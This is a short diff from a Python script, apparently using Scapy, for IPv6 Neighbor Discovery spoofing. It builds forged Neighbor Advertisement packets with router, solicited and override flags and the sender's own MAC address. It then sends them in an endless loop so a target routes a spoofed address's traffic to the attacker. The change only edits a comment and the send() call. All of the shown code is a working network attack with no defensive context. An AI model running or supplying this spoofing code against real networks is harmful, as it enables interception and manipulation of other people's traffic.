@@ -19,14 +19,14 @@ def ndp_spoof(target_ip6, spoof_ip6, interface="eth0"):
 		IPv6(dst=target_ip6) /
 		# R=1: "i'm a router"
 		# S=1: "this answer was solicited"
-		# O=1 "override cache"
+		# O=1: "override cache"
 		ICMPv6ND_NA(tgt=spoof_ip6, R=1, S=1, O=1) /
 		ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
 	)
 
 	print(f"[+] NDP Spoofing started:\n{target_ip6} thinks {spoof_ip6} is at me")
 	while True:
-		send(ndp_packet, verbose=False, iface=interface)
+		send(ndp_packet, verbose=False) #, iface=interface)
 		#print(f"[+] Packet sent: {target_ip6} thinks {spoof_ip6} is at {get_if_hwaddr(interface)}")
 		time.sleep(2)
 
